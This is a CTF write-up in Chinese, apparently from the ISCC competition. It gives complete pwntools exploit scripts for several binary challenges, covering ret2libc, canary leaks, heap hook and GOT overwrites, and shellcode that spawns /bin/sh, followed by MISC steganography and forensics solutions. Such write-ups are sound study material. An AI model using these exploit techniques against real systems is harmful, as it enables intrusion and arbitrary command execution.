# PWN
## attachment-7-校内
简单的32位ret2libc，查询出libc版本为 libc6-i386_2.35-0ubuntu3.8_amd64
```python
from pwn import *
from wstube import websocket
import sys

context(arch='i386', os='linux', log_level='debug')
local = True if len(sys.argv) == 1 else False
elf_path = './' + sys.argv[0][:-3]
libc_path = './'
if local:
    p = process(elf_path)
else:
    ip, port = '101.200.155.151:12400'.split(':')
    p = remote(ip, port)
    # p = websocket("")

def debug():
    if local:
        gdb.attach(p, '''
            b* main
        ''')

elf = ELF(elf_path)
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
vlun = 0x8049210
p.sendlineafter(b'name?\n', b'%23$p')
p.recvuntil(b'\n')
canary = int(p.recv(10), 16)
log.info('canary: ' + hex(canary))

payload = b'a' * (0x4c - 0xc) + p32(canary) + b'a' * 0xc + p32(puts_plt) + p32(vlun) + p32(puts_got)
p.sendlineafter(b'password?\n', payload)
p.recv()
puts_addr = u32(p.recv(4))
log.info('puts_addr: ' + hex(puts_addr))
if local:
    libc = ELF("./libc.so.6")
    libc_base = puts_addr - libc.symbols['puts']
    system_addr = libc_base + libc.symbols['system']
    binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
else:
    # from LibcSearcher import LibcSearcher
    # libc = LibcSearcher('puts', puts_addr)
    # libc_base = puts_addr - libc.dump('puts')
    # system_addr = libc_base + libc.dump('system')
    # binsh_addr = libc_base + libc.dump('str_bin_sh')

    libc_base = puts_addr - 0x072880
    system_addr = libc_base + 0x47cd0
    binsh_addr = libc_base + 0x1b90d5


p.sendlineafter(b'name?\n', b'%23$p')
payload = p32(canary) * 20 + p32(system_addr) + p32(0) + p32(binsh_addr)
payload = b'\x00' * (0x40) + p32(canary) + b'\x00' * 0xc + p32(system_addr) + p32(0) + p32(binsh_addr)
debug()
p.sendafter(b'password?\n\n', payload)
p.interactive()


```
## attachment-8-校内
用到了一点点堆的知识，free后在fastbin中，申请同样大小的堆块即可再次编辑存放flag的位置，即可满足检测条件，之后是简单的ret2libc
```python
from pwn import *
from wstube import websocket
import sys

context(arch='amd64', os='linux', log_level='debug')
local = True if len(sys.argv) == 1 else False
elf_path = './' + sys.argv[0][:-3]
libc_path = './libc-2.31.so'
if local:
    p = process(elf_path)
else:
    ip, port = '101.200.155.151:12200'.split(':')
    p = remote(ip, port)
    # p = websocket("")

def debug():
    if local:
        gdb.attach(p, '''
            b* main
        ''')

elf = ELF(elf_path)
libc = ELF(libc_path)
main = 0x40135c
pop_rdi = 0x4014c3
ret = 0x40101a
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

p.sendlineafter(b'size:', b'96')
p.sendlineafter(b'flag:', b'flag')
p.sendlineafter(b'ISCC', b'a' * 0x18)
p.recvuntil(b'a\n')
canary = u64(p.recv(7).rjust(8, b'\x00'))
log.info('canary: ' + hex(canary))

payload = b'a' * (0x18) + p64(canary) + b'a' * 0x8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
debug()
p.sendlineafter(b'meet you', payload)
p.recvuntil(b'meet you too!\n')
puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
log.info('puts_addr: ' + hex(puts_addr))
libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
p.sendlineafter(b'ISCC', b'a' * 0x18)

payload = b'a' * (0x18) + p64(canary) + b'a' * 0x8 + p64(ret) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
p.recvuntil(b'meet you')
p.sendline(payload)

p.interactive()
```
## call-擂台
还是ret2libc，没有puts函数，用write函数泄漏libc基址即可
```python
from pwn import *
from wstube import websocket
import sys

context(arch='amd64', os='linux', log_level='debug')
local = True if len(sys.argv) == 1 else False
elf_path = './' + sys.argv[0][:-3]
libc_path = './libc-2.31.so'
if local:
    p = process(elf_path)
else:
    ip, port = '101.200.155.151:12100'.split(':')
    p = remote(ip, port)
    # p = websocket("")

def debug():
    if local:
        gdb.attach(p, '''
            b* main
        ''')

pop_rdi = 0x401273
pop_rsi_r15 = 0x401271
ret = 0x40101a
elf = ELF(elf_path)
libc = ELF(libc_path)
write_got = elf.got['write']
write_plt = elf.plt['write']
main = 0x401136

payload = b'a' * (0x60 + 0x8)
payload += flat([
    ret,
    pop_rdi, 1,
    pop_rsi_r15, write_got, 0,
    write_plt,
    main,
])
p.recvuntil(b'is\n')
p.sendline(payload)
write_addr = u64(p.recv(6).ljust(8, b'\x00'))
log.info('write_addr: ' + hex(write_addr))
libc_base = write_addr - libc.symbols['write']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
payload = b'a' * (0x60 + 0x8)
payload += flat([
    ret,
    pop_rdi, binsh_addr,
    system_addr,
])
pause()
debug()
p.sendline(payload)

p.interactive()
```
## attachment-13-校内
堆利用的题，先用 unsorted bin 泄漏出libc基址，然后修改__malloc_hook和__realloc_hook执行ogg即可
```python
from pwn import *
from wstube import websocket
import sys

context(arch='amd64', os='linux', log_level='debug')
local = True if len(sys.argv) == 1 else False
elf_path = './' + sys.argv[0][:-3]
libc_path = './libc-2.27.so'
if local:
    p = process(elf_path)
else:
    ip, port = '101.200.155.151:12700'.split(':')
    p = remote(ip, port)
    # p = websocket("")

def debug():
    if local:
        gdb.attach(p, '''
            b* main
            b* $rebase(0xcd0)
            b* $rebase(0xa82)
            b* $rebase(0xb02)
            b* $rebase(0xb8c)
            b* $rebase(0xc46)
        ''')

def choose(index):
    p.sendlineafter(b'choice:\n', str(index).encode())

def add(idx, size):
    choose(1)
    p.sendlineafter(b'coordinate:\n', str(idx).encode())
    p.sendlineafter(b'required:\n', str(size).encode())

def delete(idx):
    choose(2)
    p.sendlineafter(b'cleanse:\n', str(idx).encode())

def edit(idx, size, content):
    choose(3)
    p.sendlineafter(b'inscription:\n', str(idx).encode())
    p.sendlineafter(b'length:\n', str(size).encode())
    p.sendafter(b'truth:\n', content)

def show(idx):
    choose(4)
    p.sendlineafter(b'truth:\n', str(idx).encode())

elf = ELF(elf_path)
libc = ELF(libc_path)


add(0, 0x20)
add(1, 0x600)
add(2, 0x20)
delete(1)
show(1)
__malloc_hook = u64(p.recv(6).ljust(8, b'\x00')) - 0x70
libc_base = __malloc_hook - libc.sym['__malloc_hook']
__realloc_hook = libc_base + libc.sym['__realloc_hook']
realloc = libc_base + libc.sym['realloc']
log.info(f"libc_base: {hex(libc_base)}")
ogg = [0x4f29e, 0x4f2a5, 0x4f302, 0x10a2fc]
delete(0)
edit(0, 0x20, p64(__malloc_hook - 0x8))
add(3, 0x20)
add(4, 0x20)
edit(4, 0x20, p64(libc_base + ogg[3]) + p64(realloc + 8)) #realloc调整栈帧让ogg满足条件
debug()
add(5, 0x20)


p.interactive()

```

## genius-区域
泄漏canary后正常构造ROP链即可
```python
from pwn import *
from wstube import websocket
import sys

context(arch='amd64', os='linux', log_level='debug')
local = True if len(sys.argv) == 1 else False
elf_path = './' + sys.argv[0][:-3]
libc_path = './'
if local:
    p = process(elf_path)
else:
    ip, port = '101.200.155.151:12000'.split(':')
    p = remote(ip, port)
    # p = websocket("")

def debug():
    if local:
        gdb.attach(p, '''
            b function3
        ''')

pop_rdi = 0x4013f3
pop_rsi_r15 = 0x4013f1
ret = 0x40101a
elf = ELF(elf_path)
system_addr = elf.symbols['system']

p.sendlineafter(b'or no?', b'no')
p.sendlineafter(b'modest.', b'thanks')
debug()
p.sendafter(b'init', b'a' * 0x18 + b'b')
p.recvuntil(b'ab')
canary = u64(b'\x00' + p.recv(7))
log.info('canary: ' + hex(canary))
stack = u64(p.recv(6) + b'\x00' * 2)
log.info('stack: ' + hex(stack))
p.recvuntil(b'you')
payload = b'a' * 0x18 + p64(canary)
payload += b'b' * 0x8 + p64(ret) + p64(pop_rdi) + p64(stack + 0x18) + p64(system_addr) + b'/bin/sh\x00'
p.sendline(payload)

p.interactive()
```

## program-区域
unsortedbin泄漏libc基址,tachebin修改next任意malloc修改got表来ogg
```python
from pwn import *
from wstube import websocket
import sys

context(arch='amd64', os='linux', log_level='debug')
local = True if len(sys.argv) == 1 else False
elf_path = './' + sys.argv[0][:-3]
libc_path = './libc.so.6'
if local:
    p = process(elf_path)
else:
    ip, port = '101.200.155.151:12300'.split(':')
    p = remote(ip, port)
    # p = websocket("")

def debug():
    if local:
        gdb.attach(p, '''
            b* 0x401514
            b* 0x401283
            b* 0x40134f
            b* 0x4013e1
            b* 0x40148e
            b free
        ''')

def choose(index):
    p.sendlineafter(b'choice:\n', str(index).encode())

def add(index, size):
    choose(1)
    p.sendlineafter(b'index:\n', str(index).encode())
    p.sendlineafter(b'size:\n', str(size).encode())

def delete(index):
    choose(2)
    p.sendlineafter(b'index:\n', str(index).encode())

def edit(index, length, content):
    choose(3)
    p.sendlineafter(b'index:\n', str(index).encode())
    p.sendlineafter(b'length:\n', str(length).encode())
    p.sendafter(b'content:\n', content)

def show(index):
    choose(4)
    p.sendlineafter(b'index:\n', str(index).encode())

def exit():
    choose(5)

libc = ELF(libc_path)

add(0, 0x20)
add(1, 0x600)
add(2, 0x20)
delete(1)
show(1)

__malloc_hook = u64(p.recv(6) + b'\x00' * 2) - 0x70
libc.address = __malloc_hook - libc.symbols['__malloc_hook']
realloc = libc.symbols['realloc']
log.info('__malloc_hook: ' + hex(__malloc_hook))
log.info('libc.address: ' + hex(libc.address))
ogg = [0xe3afe, 0xe3b01, 0xe3b04]
'''
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp
'''
add(1, 0x600)
delete(0)
delete(2)
edit(2, 0x20, p64(0x404000))
add(3, 0x20)
add(4, 0x20)
edit(4, 0x20, p64(0)*3 + p64(libc.address + ogg[1]))
debug()
delete(0)


p.interactive()
```
## Fufu-区域
有一个整数溢出漏洞，read大值后可以泄漏libc基址，之后正常构造ROP链
```python
from pwn import *
from wstube import websocket
import sys

context(arch='amd64', os='linux', log_level='debug')
local = True if len(sys.argv) == 1 else False
elf_path = './' + sys.argv[0][:-3]
libc_path = './'
if local:
    p = process(elf_path)
else:
    ip, port = '101.200.155.151:12600'.split(':')
    p = remote(ip, port)
    # p = websocket("")

def debug():
    if local:
        gdb.attach(p, '''
            b *$rebase(0x1199)
            b *$rebase(0x127c)
            b main
        ''')

def choose(index):
    p.recvuntil(b'choice? >> ')
    p.sendline(str(index).encode())

def submit(len, evidence, chicken):
    global canary, code_base, pop_rdi, ret, puts_addr
    choose(1)

    pop_rdi = 0x132f
    ret = 0x101a
    p.sendlineafter(b'limited! >> ', len)
    p.sendlineafter(b'>> ', evidence)
    recv = p.recvuntil(b'chicken!')
    recv = recv.split(b'-')
    canary = int(recv[1], 16)
    code_base = int(recv[2], 16) - 0x13d6
    pop_rdi += code_base
    ret += code_base
    log.info('canary: ' + hex(canary))
    log.info('code_base: ' + hex(code_base))
    elf = ELF(elf_path)
    puts_plt = elf.plt['puts'] + code_base
    puts_got = elf.got['puts'] + code_base

    payload = b'a' * 0x48 + p64(canary) + p64(0) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(code_base + 0x1338)
    chicken = payload
    p.sendlineafter(b'>> ', chicken)

    puts_addr = u64(p.recv(6).ljust(8, b'\x00'))

def trial(content):
    choose(2)
    p.sendlineafter(b'adjourned\n', content)

def exit():
    choose(3)



debug()
submit(b'2147483649', b'-%17$p-%19$p-', b'a' * 0x10)

choose(2)
log.info('puts_addr: ' + hex(puts_addr))
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') if local else None
libc_base = puts_addr - libc.symbols['puts'] if local else puts_addr - 0x80e50
system = libc_base + libc.symbols['system'] if local else libc_base + 0x50d70
bin_sh = libc_base + next(libc.search(b'/bin/sh')) if local else libc_base + 0x1d8678
payload = b'a' * 0x48 + p64(canary) + p64(0) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system)
p.recvuntil(b'adjourned\n')
p.sendline(payload)


p.interactive()


```
## mutsumi-区域
类似虚拟机的题目，可以写入四字节的立即数，也可以用题目给的jmp,构造shellcode来getshell,具体构造的看exp.
```python
from pwn import *
from wstube import websocket
import sys

context(arch='amd64', os='linux', log_level='debug')
local = True if len(sys.argv) == 1 else False
elf_path = './' + sys.argv[0][:-3]
libc_path = './'
if local:
    p = process(elf_path)
else:
    ip, port = '101.200.155.151:12800'.split(':')
    p = remote(ip, port)
    # p = websocket("")

def debug():
    if local:
        gdb.attach(p, '''
            b mutsumi_jit
            b run_vm
            b* $rebase(0x156b)
        ''')

def sl(s):
    p.sendline(s)
    sleep(0.1)

payload = b'''saki,ido
saki,to,tomorin     # jmp rax
saki,to,rikki       # jmp rbx
saki,to,anon        # jmp rcx
saki,to,soyorin     # jmp rdx
saki,stop'''
# /bin/sh = 0x68732f6e69622f
''' 下面payload实现的功能
mov di, 0x11
shl edi, 0x10
mov al, 0x40
shl eax, 8
add edi, eax
add edi, 6
xor eax, eax
mov rbx, qword ptr [rdi]
shl rbx, 0x20
add edi, 7
add ecx, dword ptr [rdi]
add rbx, rcx
push rbx
# 上面是将/bin/sh的地址压入栈中
mov di, 0x51
shl edi, 0x10
mov al, 0x4f
shl eax, 8
mov al, 0xf8
add rdi, eax
# 给rdi赋值为"/bin/sh"的地址，不过写wp的时候才意识到好像可以直接pop rdi
xor rax, rax
mov al, 0x3b
syscall
'''

payload = f'''saki,ido
5
saki,ido
{int(0x68732F)}
saki,ido
8
saki,ido
{int(0x6e69622F)}
saki,ido
1
saki,ido
{int(0x0011bf66)}
saki,ido
1
saki,ido
{int(0x9010e7c1)}
saki,ido
1
saki,ido
{int(0x909040b0)}
saki,ido
1
saki,ido
{int(0x9008e0c1)}
saki,ido
1
saki,ido
{int(0xc7019090)}
saki,ido
1
saki,ido
{int(0x06c78390)}
saki,ido
1
saki,ido
{int(0xc0319090)}
saki,ido
1
saki,ido
{int(0x1f8b4890)}
saki,ido
1
saki,ido
{int(0x20e3c148)}
saki,ido
1
saki,ido
{int(0x07c78390)}
saki,ido
1
saki,ido
{int(0x0f039090)}
saki,ido
1
saki,ido
{int(0xcb014890)}
saki,ido
1
saki,ido
{int(0x53909090)}

saki,ido
1
saki,ido
{int(0x0051bf66)}
saki,ido
1
saki,ido
{int(0x9010e7c1)}
saki,ido
1
saki,ido
{int(0x90904fb0)}
saki,ido
1
saki,ido
{int(0x9008e0c1)}
saki,ido
1
saki,ido
{int(0xf8b09090)}
saki,ido
1
saki,ido
{int(0xc7019090)}
saki,ido
1
saki,ido
{int(0xc0314890)}
saki,ido
1
saki,ido
{int(0x050f3bb0)}
saki,ido
1
saki,stop'''
# 发送 payload
p.recvuntil(b'come to help her\n')
debug()
p.sendline(payload)

p.interactive()


```
# MISC
## 返校之路-区域
拿到两个zip都要密码，先看到part1.zip的二进制数据，可以看出是伪加密
![[Pasted image 20250512095701.png]]
修改后可以解压出part1.zip
```readme.txt
一转眼，寒假已经过去，同学们都怀着怎样的心情踏上返校之路呢？

你是一名学生，从刚下高铁，准备乘坐19站地铁返回学校。短短的假期总是让人留恋，而返校的路似乎格外漫长。

在途中，你发现了一个神秘的压缩包，以及一张写着bfs???的纸条，这似乎隐藏着一些重要的信息。。。



```
掩码爆破密码
![[Pasted image 20250512142119.png]]
解压出三张图片
第一张图片：
用binwalk可以看出里面藏了一张png
![[Pasted image 20250512164957.png]]
foremost后有一个二维码
扫了后告诉我们flag有两段
![[039084d3f6de0aa44f455742cbbcfdc7.jpg]]
第二张图片：
用zsteg可以看到flag,先base32再base64可以出AM5rlaSL
![[Pasted image 20250512164927.png]]
第三张图片：
属性备注里面有提示
![[Pasted image 20250512165215.png]]
三号线到四号线中有好几条线可以换乘，都试了试最后发现走的是十号线，flag后加上3104
最后得到flag:ISCC{AM5rlaSL3104}

## 取证分析-区域
有两个附件，先看hint附件解压出来是一个vmem，用工具查看一下
![[Pasted image 20250512190803.png]]
在cmd里有让我们注意hahaha.zip
将文件下载下来可以看到是一个zip
![[Pasted image 20250512190837.png]]
需要解压密码
用bfs???掩码爆破可以得到解压密码
## 签个到吧
有两个二维码，第一个用QR扫出来,感觉像掩码，但现在没有压缩包
```
已解码数据 1:
-------------------------------------------------------------------------
位置:(21.1,21.1)-(377.9,21.1)-(21.1,377.9)-(377.9,377.9)
颜色正常, 正像
版本: 4
纠错等级:H, 掩码:0
内容:
???????flag
```
第二个被扭曲过，尝试手动恢复
![[Pasted image 20250514160733.png]]
最终放弃
找到一个项目https://www.cnblogs.com/alexander17/p/18551089
可以帮助恢复，枚举了一下找到两个参数是1和-2时最正常
![[Pasted image 20250514160903.png]]
![[flag_1_1_-2-re.png]]
反色旋转后还是扫不了，最后将两张二维码异或一下出了新的二维码
![[conbine.png]]
QR扫出来
```
已解码数据 1:
-------------------------------------------------------------------------
位置:(48.5,47.0)-(351.4,47.1)-(48.5,351.0)-(351.5,351.2)
颜色反色, 正像
版本: 2   
纠错等级:L, 掩码:6   
内容:
????1rAUkV9824nK
```
得到flag:
ISCC{1rAUkV9824nK}

## 睡美人
